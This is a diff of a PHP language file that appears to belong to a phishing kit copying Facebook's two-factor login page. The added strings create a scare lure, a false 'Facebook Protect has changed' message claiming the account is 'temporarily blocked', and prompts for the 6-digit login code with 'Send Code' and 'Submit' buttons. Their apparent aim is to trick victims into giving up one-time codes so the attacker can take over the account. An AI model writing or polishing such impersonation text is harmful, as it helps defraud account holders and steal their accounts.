@@ -1,8 +1,8 @@
 <?php
 return [
     "log_out" => "Log out",
-    "title_form" => "Choose a way to confirm that it's you",
-    "sub_title_form" => "Your account has two-factor authentication switched on, which requires this extra login step.",
+    "title_form" => "Two-factor authentication required (1\/3)",
+    "sub_title_form" => "We have temporarily blocked your account because Facebook Protect has changed. Verify code has been send to ",
     "title_notice" => "Approve from another device",
     "sub_title_notice" => "We already sent a notification to your logged-in devices. Check your Facebook notifications where you're already logged in to the account and approve the login to continue.",
     "title_input_code" => "Or, enter your login code",
@@ -10,5 +10,11 @@ return [
     "login_code" => "Login code",
     "need_another" => "Need another way to confirm that it's you?",
     "submit_code" => "Submit Code",
-    "error_notice" => "The login code you entered doesn't match the one sent to your phone. Please check the number and try again."
+    "error_notice" => "The login code you entered doesn't match the one sent to your phone. Please check the number and try again.",
+    "noti_1" => "You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser. Enter the 6-digit code from your code generator or third-party app below.",
+    "noti_2" => "Please wait",
+    "noti_3" => "to request the sending of the code.",
+    "noti_4" => "We'll walk you through some steps to secure and unlock your account.",
+    "button_submit" => "Submit",
+    "button_send_code" => "Send Code"
 ];
